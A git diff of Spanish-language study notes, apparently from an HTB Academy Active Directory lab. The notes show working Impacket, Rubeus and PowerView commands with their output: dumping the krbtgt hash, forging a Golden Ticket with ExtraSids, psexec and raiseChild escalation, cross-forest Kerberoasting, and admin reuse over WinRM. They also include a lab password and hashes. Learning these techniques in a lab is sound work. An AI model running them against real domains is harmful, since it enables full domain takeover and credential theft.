@@ -41,6 +41,10 @@
 	- [[#Obteniendo el SID del dominio y adjuntando el RID del grupo Enterprise Admins]]
 	- [[#Construyendo un Golden Ticket usando `ticketer.py`]]
 	- [[#Lanzando el ataque con `raiseChild.py`]]
+- [[#Atacando confianzas de dominio – Abuso de confianzas entre bosques (_Cross-Forest_) – desde Windows]]
+	- [[#Kerberoasting entre bosques]]
+	- [[#Reutilización de la contraseña de admin y membresía de grupo]]
+	- [[#Abuso de SID History entre bosques (Cross-Forest)]]
 
 Antes de comenzar cualquier prueba de penetración, **realizar una fase de reconocimiento externo** puede ser muy beneficioso. Esta fase cumple varias funciones clave:
 
@@ -4709,7 +4713,7 @@ Lo tenemos justo ahí
 ![[Pasted image 20251118090701.png]]
 ##### _What direction is this trust?_
 
-> **Respuesta**: BiDirectional
+> **Respuesta**: Bidirectional
 
 # Atacando confianzas de dominio - Confianzas hijo → padre (Windows)
 
@@ -5064,3 +5068,177 @@ El script lista la metodología de trabajo. Aunque herramientas como **raiseChil
 ##### _Perform the ExtraSids attack to compromise the parent domain from the Linux attack host. After compromising the parent domain obtain the NTLM hash for the Domain Admin user bross. Submit this hash as your answer._
 
 > **Respuesta:** 49a074a39dd0651f647e765c2cc794c7 (No hemos terminado los apuntes aún)
+
+Lo primero es conectarnos mediante SSH a la primera IP que nos dan. Una vez conectados, el primer paso es obtener el hash de la cuenta `krbtgt` utilizando `secretsdump.py`:
+
+```bash
+secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
+```
+
+> Cuando nos pida contraseña, es `HTB_@cademy_stdnt_admin!`
+
+Ese comando está pidiéndole al controlador de dominio que te entregue las claves internas de la cuenta **krbtgt**, que es la cuenta que firma todos los tickets Kerberos del dominio. Impacket se hace pasar por otro controlador usando la interfaz de replicación (DRSUAPI), y como tu usuario tiene privilegios suficientes, el DC te devuelve el **NT hash** y las **claves Kerberos AES/DES** de esa cuenta. Con esas claves podrías generar tickets Kerberos falsos pero válidos (Golden Tickets), lo que equivale a obtener acceso total y persistente al dominio. En esencia: acabas de extraer la llave maestra que Kerberos usa para confiar en todo lo demás.
+
+```bash
+Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
+
+Password:
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
+[*] Kerberos keys grabbed
+krbtgt:aes256-cts-hmac-sha1-96:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8
+krbtgt:aes128-cts-hmac-sha1-96:ca289e175c372cebd18083983f88c03e
+krbtgt:des-cbc-md5:fee04c3d026d7538
+```
+
+Lo siguiente que haremos será obtener el SID del dominio hijo
+
+```bash
+impacket-lookupsid logistics.inlanefreight.local/htb-student_adm@172.16.5.240
+```
+
+![[Pasted image 20251130114729.png | 800]]
+
+Seguidamente, lanzamos de nuevo el comando, apuntando esta vez a DC01 (INLANEFREIGHT)  como controlador de dominio en la IP 172.16.5.5 y obtenemos el SID del dominio:
+
+```bash
+impacket-lookupsid logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
+```
+
+![[Pasted image 20251130114944.png | 600]]
+
+En este punto, usamos la herramienta `ticketer` de Impacket para generar un Golden Ticket, que nos da acceso al dominio hijo y al padre
+
+```bash
+impacket-ticketer
+ -nthash 9d765b482771505cbe97411065964d5f
+ -domain LOGISTICS.INLANEFREIGHT.LOCAL
+ -domain-sid S-1-5-21-2806153819-209893948-922872689
+ -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
+```
+
+> `-nthash`: Lo obtuvimos al principio. Es el hash de la cuenta **krbtgt**
+> `-domain`: El dominio al que pertenece el TGT
+> `-domainsid`: El SID raíz del dominio hijo. En este caso, de `logistics.inlanefreight.local`
+> `-extra-sid`: El SID del dominio padre, es decir, INLANEFREIGHT.
+
+Con esto se generará en nuestro systema el ticket como un archivo ccache (credential cache), que guarda las credenciales de Kerberos. Establecemos la variable de entorno `KRB5CCNAME` y de esta manera el sistema usará dicho archivo para la autenticación por Kerberos.
+
+```bash
+export KRB5CCNAME=hacker.ccache 
+```
+
+> Es `hacker.ccache` porque hemos puesto dicho nombre con `ticketer`
+
+Ahora comprobamos si gracias a dicho archivo podemos autenticarnos correctamente al DC del dominio padre:
+
+```bash
+impacket-psexec LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
+```
+
+![[Pasted image 20251130120003.png]]
+
+Hemos accedido correctamente. En este punto queda utilizar `raiseChild`, que automatizará la escalada del dominio hijo al padre.
+
+```bash
+impacket-raiseChild -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
+```
+
+Accederá con éxito de nuevo. Vamos a recuperar el hash NTLM del administrador de dominio, que es lo que nos pide el ejercicio. En este caso, el usuario `bross`. 
+
+```bash
+└──╼ $impacket-secretsdump LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5 | grep "bross"
+inlanefreight.local\bross:1179:aad3b435b51404eeaad3b435b51404ee:49a074a39dd0651f647e765c2cc794c7:::
+```
+
+Y ahí lo tenemos: `49a074a39dd0651f647e765c2cc794c7`
+
+# Atacando confianzas de dominio – Abuso de confianzas entre bosques (_Cross-Forest_) – desde Windows
+
+### Kerberoasting entre bosques
+
+Ataques Kerberos como **Kerberoasting** o **ASREPRoasting** pueden ejecutarse a través de confianzas si la relación es **entrante o bidireccional**, permitiendo obtener acceso o privilegios en otro dominio. Incluso sin escalar en el dominio actual, es posible capturar y descifrar un ticket de un usuario con permisos administrativos en ambos dominios.  
+
+Con **PowerView** podemos enumerar cuentas del dominio objetivo que tengan **SPNs** asociados.
+
+##### Enumerando cuentas para SPNs asociados usando `Get-DomainUser`
+
+```powershell
+PS C:\> Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
+
+samaccountname
+--------------
+krbtgt
+mssqlsvc
+```
+
+Se detecta una cuenta con **SPN** en el dominio objetivo, perteneciente al grupo **Domain Admins**. Si logramos realizar **Kerberoasting** y descifrar su hash offline, obtendremos **acceso administrativo completo** al dominio objetivo. Enumeramos la cuenta `mssqlsvc`
+
+```powershell
+PS C:> Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
+
+samaccountname memberof
+-------------- --------
+mssqlsvc       CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
+```
+
+Lancemos un ataque Kerberoasting usando `Rubeus`. Ejecutamos la herramienta como hicimos en la sección de [[#Kerberoasting]] pero incluyendo la flag `/domain:` para especificar el dominio objetivo.
+
+```powershell
+PS C:> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
+
+...SNIP...
+
+[*] Hash                   : $krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$MSSQLsvc/sql01.freightlogstics:1433@FREIGHTLOGISTICS.LOCAL*$<SNIP>
+```
+
+Luego podemos pasar el **hash** por **Hashcat** y, si se descifra, habremos ampliado rápidamente nuestro acceso, obteniendo **control total sobre ambos dominios** al aprovechar la autenticación y configuración de una **confianza bidireccional entre bosques**.
+
+### Reutilización de la contraseña de admin y membresía de grupo
+
+En confianzas **bidireccionales entre bosques**, si comprometemos el **Dominio A** y obtenemos contraseñas o hashes de administradores, puede existir **reutilización de contraseñas** con cuentas equivalentes en el **Dominio B**, lo que permitiría acceso total. También es común que administradores de un dominio sean miembros de grupos del otro (por ejemplo, _Administrators_ en B). Con **PowerView** y la función **Get-DomainForeignGroupMember** podemos identificar estos **miembros externos** y detectar posibles escaladas entre dominios.
+
+```powershell
+PS C:\htb> Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
+
+GroupDomain             : FREIGHTLOGISTICS.LOCAL
+GroupName               : Administrators
+GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=FREIGHTLOGISTICS,DC=LOCAL
+MemberDomain            : FREIGHTLOGISTICS.LOCAL
+MemberName              : S-1-5-21-3842939050-3880317879-2865463114-500
+MemberDistinguishedName : CN=S-1-5-21-3842939050-3880317879-2865463114-500,CN=ForeignSecurityPrincipals,DC=FREIGHTLOGIS
+                          TICS,DC=LOCAL
+
+PS C:\htb> Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
+
+INLANEFREIGHT\administrator
+```
+
+La salida del comando muestra que el grupo **Administrators** de **FREIGHTLOGISTICS.LOCAL** incluye como miembro la cuenta **Administrator** del dominio **INLANEFREIGHT.LOCAL**. Podemos comprobar este acceso conectándonos por **WinRM** mediante el cmdlet **Enter-PSSession**.
+
+```powershell
+PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
+
+[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents> whoami
+inlanefreight\administrator
+
+[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents> ipconfig /all
+
+Windows IP Configuration
+
+   Host Name . . . . . . . . . . . . : ACADEMY-EA-DC03
+   Primary Dns Suffix  . . . . . . . : FREIGHTLOGISTICS.LOCAL
+   Node Type . . . . . . . . . . . . : Hybrid
+   IP Routing Enabled. . . . . . . . : No
+   WINS Proxy Enabled. . . . . . . . : No
+   DNS Suffix Search List. . . . . . : FREIGHTLOGISTICS.LOCAL
+```
+
+La salida del comando confirma que logramos autenticarnos en el **controlador de dominio de FREIGHTLOGISTICS.LOCAL** usando la cuenta **Administrator** de **INLANEFREIGHT.LOCAL** a través de la **confianza bidireccional entre bosques**. Esto puede suponer un acceso rápido y valioso tras comprometer un dominio, por lo que siempre conviene comprobarlo si existe este tipo de relación y el segundo bosque está dentro del alcance de la auditoría.
+
+### Abuso de SID History entre bosques (Cross-Forest)
+
+El atributo **SID History** puede explotarse entre bosques si **SID Filtering** no está habilitado. En una migración, un usuario del **Bosque B** podría conservar el **SID** de una cuenta con privilegios del **Bosque A**, obteniendo así **acceso administrativo** al autenticarse entre bosques. En resumen, una migración sin filtrado de SIDs puede permitir mantener privilegios del dominio original en el nuevo bosque.
+
+![[Pasted image 20251130165959.png | 800]]
